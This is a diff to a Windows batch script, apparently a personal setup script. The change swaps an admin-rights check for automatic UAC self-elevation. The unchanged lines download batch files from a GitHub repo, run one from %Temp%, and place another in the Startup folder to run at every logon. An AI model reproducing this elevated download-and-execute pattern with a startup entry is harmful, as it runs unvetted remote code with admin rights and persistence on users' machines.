@@ -1,15 +1,5 @@
 @echo off
-goto check_Permissions
-
-:check_Permissions
-    echo Administrative permissions required. Detecting permissions...
-
-    net session >nul 2>&1
-    if %errorLevel% == 0 (
-        echo Success: Administrative permissions confirmed.
-    ) else (
-	goto Fail
-    )
+if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 
 
 
@@ -23,8 +13,5 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/uninstall.bat', '%Temp%\uninstall.bat') }"
 start %Temp%\uninstall.bat
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/choco.bat', '%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\choco.bat') }"
-
-
-:Fail
 exit
 
